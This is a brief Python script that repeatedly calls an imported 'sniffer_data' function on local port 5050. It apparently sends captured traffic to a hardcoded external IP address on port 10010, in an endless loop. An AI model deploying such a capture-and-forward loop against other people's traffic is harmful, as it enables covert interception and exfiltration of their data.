from sniff_sv import sniffer_data

if __name__ == '__main__':
    dest_address = "91.199.226.7"
    dest_port = 10010
    while True:
        sniffer_data(port=5050, destination=dest_address, destination_port=dest_port)
